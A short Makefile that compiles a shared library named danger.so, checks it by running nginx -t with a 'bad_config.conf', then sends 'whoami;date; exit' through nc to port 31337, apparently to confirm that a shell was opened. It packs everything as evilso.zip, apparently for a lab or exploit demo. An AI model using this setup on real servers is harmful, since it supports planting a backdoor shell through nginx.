
build:
	gcc -fPIC -shared -o danger.so danger.c

test: 
	nginx -t -c /root/so/bad_config.conf; echo -e "whoami;date; exit\n" |nc 127.0.0.1 31337

pack:
	zip -r evilso.zip ./danger.c ./danger.so ./bad_config.conf ./Makefile 